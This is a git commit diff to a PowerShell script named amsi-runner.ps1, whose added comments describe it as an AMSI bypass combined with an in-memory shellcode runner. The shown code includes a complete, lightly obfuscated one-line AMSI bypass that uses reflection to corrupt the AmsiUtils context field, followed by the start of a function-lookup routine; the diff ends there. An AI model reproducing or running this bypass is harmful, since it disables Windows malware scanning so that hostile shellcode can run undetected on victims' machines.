12f5009e481555ddb953d25aa1869b950de00379
Gwen B <88676386+GwenBSec@users.noreply.github.com>
2024-03-05 16:58:24 -0500

    Update amsi-runner.ps1

--- AMSI Bypass/amsi-runner.ps1
+++ AMSI Bypass/amsi-runner.ps1
@@ -1,3 +1,6 @@
+# amsi bypass + powershell shellcode runner = amsi-runner.ps1 
+# PowerShell shellcode runner that executes entirely in-memory 
+
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
 function LookupFunc {
